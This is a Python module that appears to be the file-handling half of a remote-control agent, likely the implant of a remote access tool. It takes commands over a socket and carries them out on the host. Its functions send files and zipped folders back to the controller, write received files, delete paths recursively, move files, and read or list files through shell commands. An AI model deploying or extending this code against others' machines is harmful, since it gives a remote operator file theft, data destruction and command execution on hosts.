import os
import shutil
import subprocess
import base64
import shlex

from agent.core.protocol import reliable_send, reliable_recv


def download_file(sock, file_name):
    try:
        content = reliable_recv(sock)
        with open(file_name, 'wb') as f:
            f.write(base64.b64decode(content))
    except Exception:
        pass


def upload_file(sock, file_name):
    try:
        file_to_send = file_name
        is_dir = False

        if os.path.isdir(file_name):
            is_dir = True
            shutil.make_archive(file_name, 'zip', file_name)
            file_to_send = file_name + '.zip'

        with open(file_to_send, 'rb') as f:
            reliable_send(sock, base64.b64encode(f.read()).decode())

        if is_dir:
            os.remove(file_to_send)

    except Exception as e:
        reliable_send(sock, f'[-] Error: {str(e)}')


def list_dir(sock, platform, path=None):
    cmd = platform.list_dir_cmd(path)
    result = subprocess.run(cmd, shell=True, capture_output=True)
    output = _decode_output(result.stdout, result.stderr)
    reliable_send(sock, output)


def change_dir(sock, target):
    try:
        os.chdir(target)
        reliable_send(sock, f'[+] Changed directory to: {os.getcwd()}')
    except Exception as e:
        reliable_send(sock, f'[-] Error changing directory: {str(e)}')


def current_dir(sock):
    reliable_send(sock, os.getcwd())


def delete(sock, arg_str):
    try:
        target_path = arg_str.strip()
        if target_path.startswith('"') and target_path.endswith('"'):
            target_path = target_path[1:-1]

        recursive = False
        if target_path.startswith('-r '):
            recursive = True
            target_path = target_path[3:].strip()
            if target_path.startswith('"') and target_path.endswith('"'):
                target_path = target_path[1:-1]

        if os.path.exists(target_path):
            if os.path.isdir(target_path):
                if recursive:
                    shutil.rmtree(target_path)
                    reliable_send(sock, f'[+] Directory deleted recursively: {target_path}')
                else:
                    try:
                        os.rmdir(target_path)
                        reliable_send(sock, f'[+] Directory deleted: {target_path}')
                    except OSError:
                        reliable_send(sock, f'[-] Directory not empty. Use "rm -r {target_path}"')
            else:
                os.remove(target_path)
                reliable_send(sock, f'[+] File deleted: {target_path}')
        else:
            reliable_send(sock, '[-] Path not found')
    except Exception as e:
        reliable_send(sock, f'[-] Error deleting: {str(e)}')


def move(sock, arg_str):
    try:
        args = shlex.split(arg_str, posix=False)
        if len(args) >= 2:
            shutil.move(args[0], args[1])
            reliable_send(sock, f'[+] Moved {args[0]} to {args[1]}')
        else:
            reliable_send(sock, '[-] Usage: mv <source> <dest>')
    except Exception as e:
        reliable_send(sock, f'[-] Error moving: {str(e)}')


def read_file(sock, platform, path):
    cmd = platform.read_file_cmd(path.strip())
    result = subprocess.run(cmd, shell=True, capture_output=True)
    output = _decode_output(result.stdout, result.stderr)
    reliable_send(sock, output)


def touch(sock, platform, path):
    cmd = platform.touch_cmd(path.strip())
    subprocess.run(cmd, shell=True, capture_output=True)
    reliable_send(sock, f'[+] Created: {path.strip()}')


def _decode_output(stdout, stderr):
    result = stdout + stderr
    try:
        return result.decode('utf-8', errors='replace')
    except Exception:
        try:
            return result.decode('latin-1', errors='replace')
        except Exception:
            return str(result)
